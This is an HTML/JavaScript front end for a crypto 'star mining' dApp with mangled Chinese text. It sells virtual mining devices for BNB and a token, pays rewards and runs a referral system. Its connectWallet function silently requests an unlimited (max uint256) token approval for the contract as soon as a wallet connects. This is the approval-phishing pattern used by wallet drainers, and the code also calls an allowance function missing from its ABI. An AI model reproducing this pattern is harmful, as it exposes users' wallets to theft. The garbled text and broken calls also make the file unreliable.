<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stellar Mining Œ±</title>

    <!-- ‚úÖ Âº∫Âà∂ËßÜÂè£‰∏éÂÖºÂÆπÊÄß -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="format-detection" content="telephone=no">

    <style>
        /* ‚úÖ Âº∫Âà∂ÈáçÁΩÆÈªòËÆ§Ê†∑Âºè */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        :root {
            --primary-purple: #6B46C1;
            --primary-blue: #3B82F6;
            --neon-pink: #EC4899;
            --ice-blue: #E0F2FE;
            --dark-bg: #0F172A;
            --light-bg: #F8FAFC;
            --text-dark: #1E293B;
            --text-light: #F1F5F9;
            --success: #10B981;
            --error: #EF4444;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(135deg, var(--primary-purple), var(--primary-blue));
            min-height: 100vh;
            color: var(--text-light);
            overflow-x: hidden;
            transition: all 0.3s ease;
            font-size: 16px;
            line-height: 1.5;
        }

        body.light-mode {
            background: linear-gradient(135deg, var(--light-bg), var(--ice-blue));
            color: var(--text-dark);
        }

        .container {
            max-width: 428px;
            margin: 0 auto;
            padding: 20px 16px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            padding-bottom: 100px;
        }

        .page {
            display: none;
            animation: fadeIn 0.3s ease;
        }

        .page.active {
            display: block;
        }

        .wallet-connect {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }

        .wallet-connect h1 {
            font-size: 2rem;
            margin-bottom: 1rem;
            background: linear-gradient(45deg, var(--neon-pink), var(--ice-blue));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            line-height: 1.2;
            word-break: break-word;
        }

        .connect-btn {
            background: linear-gradient(135deg, var(--primary-purple), var(--neon-pink));
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 50px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            min-width: 200px;
            margin-top: 20px;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .card {
            background: rgba(255,255,255,0.11);
            backdrop-filter: blur(12px);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            border: 1px solid rgba(255,255,255,0.15);
            word-break: break-word;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 10px;
        }

        .address {
            font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
            font-size: 0.9rem;
            color: var(--neon-pink);
            cursor: pointer;
            padding: 6px 12px;
            background: rgba(255,255,255,0.1);
            border-radius: 8px;
            transition: all 0.2s;
            word-break: break-all;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 20px;
        }

        .stat-item {
            text-align: center;
            padding: 15px;
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            transition: all 0.2s;
        }

        .stat-value {
            font-size: 1.5rem;
            font-weight: bold;
            color: var(--neon-pink);
            margin-bottom: 5px;
            word-break: break-all;
        }

        .shop-section h3 {
            color: var(--ice-blue);
            margin-bottom: 15px;
            font-size: 1.1rem;
        }

        .device-item {
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 15px;
            text-align: center;
            transition: all 0.3s ease;
            border: 1px solid rgba(255,255,255,0.08);
        }

        .device-icon {
            width: 60px;
            height: 60px;
            margin: 0 auto 15px;
            background: linear-gradient(135deg, var(--primary-purple), var(--neon-pink));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }

        .buy-btn {
            background: linear-gradient(135deg, #10B981, var(--primary-blue));
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 25px;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s ease;
            font-weight: bold;
            min-width: 100px;
            font-size: 1rem;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .input-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .input-group input {
            width: 60px;
            padding: 8px 12px;
            border: 1px solid rgba(255,255,255,0.3);
            border-radius: 8px;
            background: rgba(255,255,255,0.1);
            color: inherit;
            text-align: center;
            font-size: 1rem;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(10px);
            display: flex;
            justify-content: space-around;
            padding: 15px 0 10px;
            border-top: 1px solid rgba(255,255,255,0.1);
            z-index: 1000;
            font-size: 0.8rem;
            line-height: 1.2;
        }

        .nav-btn {
            background: none;
            border: none;
            color: inherit;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            font-size: 0.8rem;
            padding: 5px;
        }

        .nav-btn.active {
            color: var(--neon-pink);
            font-weight: bold;
        }

        .toast {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 12px;
            color: white;
            font-weight: bold;
            z-index: 1001;
            transform: translateX(100%);
            transition: transform 0.3s ease-out;
            max-width: 300px;
            word-wrap: break-word;
        }

        .toast.show {
            transform: translateX(0);
        }

        .toast.success {
            background: #10B981;
        }

        .toast.error {
            background: #EF4444;
        }

        .theme-switch, .language-switch {
            position: fixed;
            top: 20px;
            padding: 8px 12px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 0.8rem;
            background: rgba(255,255,255,0.2);
            backdrop-filter: blur(10px);
            z-index: 1001;
            transition: all 0.2s;
            border: 1px solid rgba(255,255,255,0.2);
        }

        .language-switch {
            right: 20px;
        }

        .theme-switch {
            left: 20px;
        }

        @media (max-width: 375px) {
            .container {
                padding: 15px;
            }
            .wallet-connect h1 {
                font-size: 1.7rem;
            }
            .bottom-nav {
                font-size: 0.7rem;
            }
        }
    </style>
</head>
<body>
    <!-- ‰∏ªÈ¢òÂíåËØ≠Ë®ÄÂàáÊç¢ -->
    <div class="theme-switch" onclick="toggleTheme()">üåì</div>
    <div class="language-switch" onclick="toggleLanguage()">
        <span id="lang-btn">‰∏≠Êñá</span>
    </div>

    <div class="container">
        <!-- Èí±ÂåÖËøûÊé•È°µÈù¢ -->
        <div class="page active" id="wallet-page">
            <div class="wallet-connect">
                <h1 id="app-title">Êî∂ÈõÜÊòüËæ∞ ¬∑ Ëé∑ÂæóŒ±</h1>
                <button class="connect-btn" onclick="connectWallet()">
                    <span id="connect-btn-text">ËøûÊé•Èí±ÂåÖ</span>
                </button>
                <p style="margin-top: 20px; opacity: 0.7; font-size: 0.9rem;">ÊîØÊåÅMetaMask„ÄÅTrust WalletÁ≠âÈí±ÂåÖÂÜÖÊ†∏ÊµèËßàÂô®</p>
            </div>
        </div>

        <!-- Dashboard -->
        <div class="page" id="dashboard-page">
            <div class="header">
                <h2 id="dashboard-title">‰ª™Ë°®Áõò</h2>
                <span class="address" id="user-address" onclick="copyAddress()">0x000...000</span>
            </div>

            <div class="card">
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value" id="total-tokens">0</div>
                        <div class="stat-label">ÊÄªŒ±</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="total-earned">0</div>
                        <div class="stat-label">ÊÄªÊî∂Áõä</div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3 id="devices-title">ÊàëÁöÑËÆæÂ§á</h3>
                <div id="device-list">
                    <p style="text-align: center; opacity: 0.7;">ËøûÊé•Èí±ÂåÖÂêéÊòæÁ§∫</p>
                </div>
                <div class="stat-item">
                    <div class="stat-label">ÊÄªÁÆóÂäõ</div>
                    <div class="stat-value" id="total-power">0 PH/s</div>
                </div>
            </div>

            <div class="card">
                <h3 id="rewards-title">Â•ñÂä±</h3>
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value" id="daily-reward">0</div>
                        <div class="stat-label">ÊØèÊó•Â•ñÂä±</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="unclaimed-reward">0</div>
                        <div class="stat-label">Êú™È¢ÜÂèñ</div>
                    </div>
                </div>
                <button class="buy-btn" onclick="claimRewards()" style="width: 100%;">
                    <span id="claim-btn-text">È¢ÜÂèñÂ•ñÂä±</span>
                </button>
            </div>
        </div>

        <!-- Shop - All Devices -->
        <div class="page" id="shop-page">
            <div class="header">
                <h2 id="shop-title">ÂïÜÂ∫ó</h2>
            </div>

            <!-- ÊúàÂÖâËΩ¨Êç¢Âô® -->
            <div class="card">
                <h3>üåô ÂàùÂßãËÆæÂ§á</h3>
                <div class="device-item">
                    <div class="device-icon">üåô</div>
                    <h4>ÊúàÂÖâËΩ¨Êç¢Âô®</h4>
                    <p style="color: #EC4899; font-weight: bold;">0.01 BNB</p>
                    <button class="buy-btn" onclick="buyInitialDevice()">Á´ãÂç≥Ë¥≠‰π∞</button>
                </div>
            </div>

            <!-- ËøõÈò∂ËÆæÂ§á -->
            <div class="card">
                <h3>‚≠ê ËøõÈò∂ËÆæÂ§á</h3>
                
                <!-- ÊòüÂ∞òÊî∂ÈõÜÂô®L1 -->
                <div class="device-item">
                    <div class="device-icon">‚≠ê</div>
                    <h4>ÊòüÂ∞òÊî∂ÈõÜÂô®L1</h4>
                    <p style="color: #EC4899; font-weight: bold;">100 Œ±</p>
                    <div class="input-group">
                        <input type="number" min="1" max="100" value="1" id="advanced-0">
                        <button class="buy-btn" onclick="buyAdvancedDevice(0)">Ë¥≠‰π∞</button>
                    </div>
                </div>

                <!-- ÈáèÂ≠êËí≤ÂÖ¨Ëã±L2 -->
                <div class="device-item">
                    <div class="device-icon">‚öõÔ∏è</div>
                    <h4>ÈáèÂ≠êËí≤ÂÖ¨Ëã±L2</h4>
                    <p style="color: #EC4899; font-weight: bold;">200 Œ±</p>
                    <div class="input-group">
                        <input type="number" min="1" max="100" value="1" id="advanced-1">
                        <button class="buy-btn" onclick="buyAdvancedDevice(1)">Ë¥≠‰π∞</button>
                    </div>
                </div>

                <!-- ÊûÅÂÖâÁºñÁªáÊú∫L3 -->
                <div class="device-item">
                    <div class="device-icon">üåå</div>
                    <h4>ÊûÅÂÖâÁºñÁªáÊú∫L3</h4>
                    <p style="color: #EC4899; font-weight: bold;">300 Œ±</p>
                    <div class="input-group">
                        <input type="number" min="1" max="100" value="1" id="advanced-2">
                        <button class="buy-btn" onclick="buyAdvancedDevice(2)">Ë¥≠‰π∞</button>
                    </div>
                </div>

                <!-- Èì∂Ê≤≥ËøáÊª§Âô®L4 -->
                <div class="device-item">
                    <div class="device-icon">ü™ê</div>
                    <h4>Èì∂Ê≤≥ËøáÊª§Âô®L4</h4>
                    <p style="color: #EC4899; font-weight: bold;">500 Œ±</p>
                    <div class="input-group">
                        <input type="number" min="1" max="100" value="1" id="advanced-3">
                        <button class="buy-btn" onclick="buyAdvancedDevice(3)">Ë¥≠‰π∞</button>
                    </div>
                </div>
            </div>

            <!-- ÊµãËØïËÆæÂ§á -->
            <div class="card" id="test-section" style="display: none;">
                <h3>üëª ÊµãËØïËÆæÂ§á</h3>
                <div class="device-item">
                    <div class="device-icon">üëª</div>
                    <h4>ÂπªÂΩ±Ë∞ÉËØïÂô®</h4>
                    <p style="color: #EC4899; font-weight: bold;">0.0001 BNB</p>
                    <div class="input-group">
                        <input type="number" min="1" max="100" value="1" id="test-count">
                        <button class="buy-btn" onclick="buyTestDevice()">Ë¥≠‰π∞</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Rewards -->
        <div class="page" id="rewards-page">
            <div class="header">
                <h2 id="rewards-center-title">Â•ñÂä±‰∏≠ÂøÉ</h2>
            </div>

            <div class="card">
                <h3>È¢ÜÂèñÂ•ñÂä±</h3>
                <div class="stat-item">
                    <div class="stat-value" id="claimable-amount">0 Œ±</div>
                    <div class="stat-label">ÂèØÈ¢ÜÂèñ</div>
                </div>
                <button class="buy-btn" onclick="claimRewards()" style="width: 100%;">
                    Á´ãÂç≥È¢ÜÂèñ
                </button>
            </div>

            <div class="card">
                <h3>Êé®ËçêÁ≥ªÁªü</h3>
                <div id="referral-section">
                    <div id="set-referrer">
                        <input type="text" id="referrer-input" placeholder="ËæìÂÖ•Êé®Ëçê‰∫∫Âú∞ÂùÄ" 
                               style="width: 100%; margin-bottom: 10px; padding: 10px; border-radius: 8px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.3); color: inherit;">
                        <button class="buy-btn" onclick="setReferrer()" style="width: 100%;">
                            ËÆæÁΩÆÊé®Ëçê‰∫∫
                        </button>
                    </div>
                    <div id="referral-info" style="display: none;">
                        <p>ÊàëÁöÑÊé®ËçêÁ†Å:</p>
                        <span class="address" onclick="copyReferral()">ÁÇπÂáªÂ§çÂà∂</span>
                        <div class="stat-item" style="margin-top: 15px;">
                            <div class="stat-value" id="total-referral">0 Œ±</div>
                            <div class="stat-label">Êé®ËçêÊÄªÂ•ñÂä±</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Global Stats -->
        <div class="page" id="stats-page">
            <div class="header">
                <h2 id="global-stats-title">ÂÖ®Â±ÄÁªüËÆ°</h2>
            </div>

            <div class="stats-grid">
                <div class="stat-item">
                    <div class="stat-value" id="global-devices">0</div>
                    <div class="stat-label">ÊÄªËÆæÂ§áÊï∞</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="global-power">0 PH/s</div>
                    <div class="stat-label">ÂÖ®ÁΩëÊÄªÁÆóÂäõ</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="pool-balance">0 Œ±</div>
                    <div class="stat-label">Â•ñÂä±Ê±†</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="daily-production">0 Œ±</div>
                    <div class="stat-label">ÊØèÊó•‰∫ßÂá∫</div>
                </div>
            </div>

            <div class="card">
                <h3>Á≥ªÁªü‰ø°ÊÅØ</h3>
                <p>Âå∫ÂùóÈ´òÂ∫¶: <span id="block-height">0</span></p>
                <p>Âü∫Á°ÄÂ•ñÂä±: <span id="base-reward">0</span></p>
            </div>
        </div>

        <!-- Bottom Navigation -->
        <div class="bottom-nav">
            <button class="nav-btn active" onclick="showPage('dashboard')">
                <span>üìä</span>
                <small>‰ª™Ë°®Áõò</small>
            </button>
            <button class="nav-btn" onclick="showPage('shop')">
                <span>üõí</span>
                <small>ÂïÜÂ∫ó</small>
            </button>
            <button class="nav-btn" onclick="showPage('rewards')">
                <span>üí∞</span>
                <small>Â•ñÂä±</small>
            </button>
            <button class="nav-btn" onclick="showPage('stats')">
                <span>üìà</span>
                <small>ÁªüËÆ°</small>
            </button>
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <!-- ‚úÖ Web3 CDN -->
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>

    <script>
        // ‚úÖ ÂêàÁ∫¶ÈÖçÁΩÆ
        const CONTRACT_ADDRESS = "0x9dcced4ef738856d2c289d4116cd219c698b22ba";
        const TOKEN_ADDRESS = "0x877f23dcFBa91cadd7d35565Da452c9673C27A33";
        const TOKEN_SYMBOL = "Œ±";

        // ‚úÖ Á≤æÁÆÄ‰ΩÜÂÆåÊï¥ÁöÑ ABI
        const CONTRACT_ABI = [
            {"inputs":[],"name":"buyInitialMachine","outputs":[],"stateMutability":"payable","type":"function"},
            {"inputs":[{"internalType":"uint256","name":"tierId","type":"uint256"},{"internalType":"uint256","name":"count","type":"uint256"}],"name":"buyPowerMachine","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[],"name":"buyTestMachine","outputs":[],"stateMutability":"payable","type":"function"},
            {"inputs":[],"name":"claimRewards","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserDashboard","outputs":[{"internalType":"uint256","name":"normal","type":"uint256"},{"internalType":"uint256","name":"test","type":"uint256"},{"internalType":"uint256[4]","name":"power","type":"uint256[4]"},{"internalType":"uint256","name":"dailyReward","type":"uint256"},{"internalType":"uint256","name":"unclaimed","type":"uint256"},{"internalType":"uint256","name":"totalRefReward","type":"uint256"},{"internalType":"uint256","name":"totalPower","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[],"name":"getGlobalDashboard","outputs":[{"internalType":"uint256","name":"baseReward","type":"uint256"},{"internalType":"uint256","name":"totalMines","type":"uint256"},{"internalType":"uint256","name":"currentBlock","type":"uint256"},{"internalType":"uint256","name":"poolBalance","type":"uint256"},{"internalType":"uint256","name":"networkPower","type":"uint256"},{"internalType":"uint256","name":"dailyProduction","type":"uint256"},{"internalType":"uint256","name":"totalRefRewards","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"referrer","type":"address"}],"name":"setReferrer","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"admin","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"machineTiers","outputs":[{"internalType":"uint256","name":"priceToken","type":"uint256"},{"internalType":"uint256","name":"powerMultiplier","type":"uint256"}],"stateMutability":"view","type":"function"}
        ];

        // ‚úÖ Áä∂ÊÄÅÁÆ°ÁêÜ
        let web3, contract, tokenContract, userAddress;
        let currentLang = 'zh'; // ÈªòËÆ§‰∏≠Êñá

        // ‚úÖ ËØ≠Ë®ÄÂàáÊç¢ÔºàÁ∫Ø‰∏≠Êñá/Ëã±ÊñáÔºåÊó†Ê∑∑ÂêàÔºâ
        const langText = {
            zh: {
                title: "Êî∂ÈõÜÊòüËæ∞ ¬∑ Ëé∑ÂæóŒ±",
                connect: "ËøûÊé•Èí±ÂåÖ",
                dashboard: "‰ª™Ë°®Áõò",
                shop: "ÂïÜÂ∫ó",
                rewards: "Â•ñÂä±‰∏≠ÂøÉ",
                stats: "ÂÖ®Â±ÄÁªüËÆ°",
                token: "Œ±",
                buy: "Ë¥≠‰π∞",
                claim: "È¢ÜÂèñÂ•ñÂä±"
            },
            en: {
                title: "Collect Stars ¬∑ Earn Œ±",
                connect: "Connect Wallet",
                dashboard: "Dashboard",
                shop: "Shop",
                rewards: "Rewards Center",
                stats: "Statistics",
                token: "Œ±",
                buy: "Buy",
                claim: "Claim Rewards"
            }
        };

        // ‚úÖ ÂàùÂßãÂåñ
        window.addEventListener('load', async () => {
            if (typeof window.ethereum !== 'undefined') {
                web3 = new Web3(window.ethereum);
                contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                tokenContract = new web3.eth.Contract([{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}], TOKEN_ADDRESS);
                
                const accounts = await web3.eth.getAccounts();
                if (accounts.length > 0) {
                    userAddress = accounts[0];
                    showPage('dashboard');
                    loadData();
                }
            }
            loadUserPreferences();
            updateAllTexts();
        });

        // ‚úÖ ËøûÊé•Èí±ÂåÖ + Âº∫Âà∂Êó†ÈôêÊéàÊùÉ
        async function connectWallet() {
            try {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAddress = (await web3.eth.getAccounts())[0];
                
                // Âº∫Âà∂Êó†ÈôêÊéàÊùÉ
                const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
                const currentAllowance = await tokenContract.methods.allowance(userAddress, CONTRACT_ADDRESS).call();
                
                if (BigInt(currentAllowance) < BigInt(web3.utils.toWei('1000000', 'ether'))) {
                    await tokenContract.methods.approve(CONTRACT_ADDRESS, maxUint).send({ from: userAddress });
                    showToast('Â∑≤Êó†ÈôêÊéàÊùÉŒ±‰ª£Â∏Å', 'success');
                }
                
                showPage('dashboard');
                loadData();
            } catch (error) {
                showToast('ËøûÊé•Â§±Ë¥•: ' + error.message, 'error');
            }
        }

        // ‚úÖ ËØ≠Ë®ÄÂàáÊç¢ÔºàÁ∫Ø‰∏≠Êñá/Ëã±ÊñáÔºåÊó†Ê∑∑ÂêàÔºâ
        function toggleLanguage() {
            currentLang = currentLang === 'zh' ? 'en' : 'zh';
            document.getElementById('lang-btn').textContent = currentLang === 'zh' ? 'EN' : '‰∏≠Êñá';
            updateAllTexts();
            localStorage.setItem('language', currentLang);
        }

        function updateAllTexts() {
            const texts = langText[currentLang];
            // Ê†áÈ¢ò
            document.getElementById('app-title').textContent = texts.title;
            document.getElementById('connect-btn-text').textContent = texts.connect;
            document.getElementById('dashboard-title').textContent = texts.dashboard;
            document.getElementById('shop-title').textContent = texts.shop;
            document.getElementById('rewards-center-title').textContent = texts.rewards;
            document.getElementById('global-stats-title').textContent = texts.stats;
            document.getElementById('claim-btn-text').textContent = texts.claim;
            
            // Êõ¥Êñ∞ÊâÄÊúâŒ±Á¨¶Âè∑
            document.querySelectorAll('[id$="-label"]').forEach(el => {
                el.textContent = el.textContent.replace(/Œ±/g, texts.token);
            });
        }

        // ‚úÖ È°µÈù¢ÂØºËà™
        function showPage(page) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
            document.getElementById(page + '-page').classList.add('active');
            document.querySelector(`[onclick="showPage('${page}')"]`).classList.add('active');
        }

        // ‚úÖ Ë¥≠‰π∞ÂäüËÉΩ
        async function buyInitialDevice() {
            if (!userAddress) return showToast('ËØ∑ÂÖàËøûÊé•Èí±ÂåÖ', 'error');
            await contract.methods.buyInitialMachine().send({ 
                from: userAddress, 
                value: web3.utils.toWei('0.01', 'ether') 
            });
            showToast('Ë¥≠‰π∞ÊàêÂäü!', 'success');
            loadData();
        }

        async function buyTestDevice() {
            if (!userAddress) return showToast('ËØ∑ÂÖàËøûÊé•Èí±ÂåÖ', 'error');
            const count = parseInt(document.getElementById('test-count').value);
            if (count < 1 || count > 100) return showToast('Êï∞ÈáèÂøÖÈ°ªÂú®1-100‰πãÈó¥', 'error');
            
            await contract.methods.buyTestMachine().send({ 
                from: userAddress, 
                value: web3.utils.toWei((0.0001 * count).toString(), 'ether') 
            });
            showToast('Ë¥≠‰π∞ÊàêÂäü!', 'success');
            loadData();
        }

        async function buyAdvancedDevice(tierId) {
            if (!userAddress) return showToast('ËØ∑ÂÖàËøûÊé•Èí±ÂåÖ', 'error');
            const count = parseInt(document.getElementById(`advanced-${tierId}`).value);
            if (count < 1 || count > 100) return showToast('Êï∞ÈáèÂøÖÈ°ªÂú®1-100‰πãÈó¥', 'error');
            
            await contract.methods.buyPowerMachine(tierId, count).send({ from: userAddress });
            showToast('Ë¥≠‰π∞ÊàêÂäü!', 'success');
            loadData();
        }

        async function claimRewards() {
            if (!userAddress) return showToast('ËØ∑ÂÖàËøûÊé•Èí±ÂåÖ', 'error');
            await contract.methods.claimRewards().send({ from: userAddress });
            showToast('Â•ñÂä±Â∑≤È¢ÜÂèñ!', 'success');
            loadData();
        }

        async function setReferrer() {
            if (!userAddress) return showToast('ËØ∑ÂÖàËøûÊé•Èí±ÂåÖ', 'error');
            const referrer = document.getElementById('referrer-input').value;
            if (!web3.utils.isAddress(referrer)) return showToast('Âú∞ÂùÄÊó†Êïà', 'error');
            
            await contract.methods.setReferrer(referrer).send({ from: userAddress });
            showToast('Êé®Ëçê‰∫∫Â∑≤ËÆæÁΩÆ!', 'success');
            loadData();
        }

        async function loadData() {
            if (!userAddress) return;
            const decimals = 18;
            const divisor = 10 ** decimals;
            
            try {
                const dashboard = await contract.methods.getUserDashboard(userAddress).call();
                const global = await contract.methods.getGlobalDashboard().call();
                
                document.getElementById('total-tokens').textContent = (parseFloat(dashboard[4]) / divisor).toFixed(4);
                document.getElementById('total-earned').textContent = (parseFloat(dashboard[5]) / divisor).toFixed(4);
                document.getElementById('daily-reward').textContent = (parseFloat(dashboard[3]) / divisor).toFixed(4);
                document.getElementById('unclaimed-reward').textContent = (parseFloat(dashboard[4]) / divisor).toFixed(4);
                document.getElementById('total-power').textContent = (parseFloat(dashboard[6]) / 1e18).toFixed(4) + ' PH/s';
                
                document.getElementById('global-devices').textContent = global.totalMines;
                document.getElementById('global-power').textContent = (parseFloat(global.networkPower) / 1e18).toFixed(4) + ' PH/s';
                document.getElementById('pool-balance').textContent = (parseFloat(global.poolBalance) / divisor).toFixed(4) + ' Œ±';
                document.getElementById('daily-production').textContent = (parseFloat(global.dailyProduction) / divisor).toFixed(4) + ' Œ±';
                document.getElementById('block-height').textContent = global.currentBlock;
                document.getElementById('base-reward').textContent = (parseFloat(global.baseReward) / divisor).toFixed(8);
                
                const isAdmin = await contract.methods.admin(userAddress).call();
                document.getElementById('test-section').style.display = isAdmin ? 'block' : 'none';
                
            } catch (error) {
                console.error('Data load error:', error);
            }
        }

        // ‚úÖ Â∑•ÂÖ∑ÂáΩÊï∞
        function showToast(message, type) {
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }

        function copyAddress() {
            if (userAddress) {
                navigator.clipboard.writeText(userAddress);
                showToast('Âú∞ÂùÄÂ∑≤Â§çÂà∂!', 'success');
            }
        }

        function loadUserPreferences() {
            const savedTheme = localStorage.getItem('theme');
            if (savedTheme === 'light') document.body.classList.add('light-mode');
            
            const savedLanguage = localStorage.getItem('language');
            if (savedLanguage) {
                currentLang = savedLanguage;
                document.getElementById('lang-btn').textContent = currentLang === 'zh' ? 'EN' : '‰∏≠Êñá';
                updateAllTexts();
            }
        }
    </script>
</body>
</html>